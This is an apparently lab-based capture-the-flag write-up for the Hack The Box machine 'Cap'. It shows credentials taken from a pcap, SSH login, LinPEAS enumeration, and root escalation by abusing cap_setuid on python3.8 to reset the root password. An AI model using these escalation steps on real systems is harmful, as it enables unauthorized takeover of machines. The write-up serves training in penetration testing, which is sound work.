# CAP

### User flag

If we try to access the IP we will find a webpage. We can find a list of the ports under the Dashboard section. If we keep investigating we will find that we can download a .pcap file. Opening it with wireshark we can find the user and password for the user `nathan`, since he entered it via plain FTP.

So to get the user flag we will just connect via ssh with the user and password we've got.

```
┌─[user@kali]─[~]
└──╼ $ssh nathan@10.10.10.245
nathan@10.10.10.245's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

Last login: Mon Sep 27 16:20:45 2021 from 10.10.14.225

```

### Root flag

Now that we have user access, we have to look for a way to escalate priveleges. We'll use [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS):

```
┌─[user@kali]─[~/Desktop/HTB]
└──╼ $scp linpeas.sh nathan@10.10.10.245:/home/nathan
nathan@10.10.10.245's password:
linpeas.sh      
...
nathan@cap:~$ chmod a+x linpeas.sh
nathan@cap:~$ ./linpeas.sh &> out.txt
```

If we take a look to the file, we will find this line underlined in yellow:

```
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Which means that python3.8 file has the SETUID bit set, which can be easily exploitable:

```
nathan@cap:~$ /usr/bin/python3.8
Python 3.8.5 (default, Jan 27 2021, 15:41:15)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> from subprocess import Popen
>>> Popen('passwd')
<subprocess.Popen object at 0x7f7eef5f7190>
>>> New password:
Retype new password:
passwd: password updated successfully
```

Now just log in as root and obtain the flag

```
nathan@cap:~$ su
Password:
root@cap:/home/nathan# cd /root/
root@cap:~# cat root.txt
```
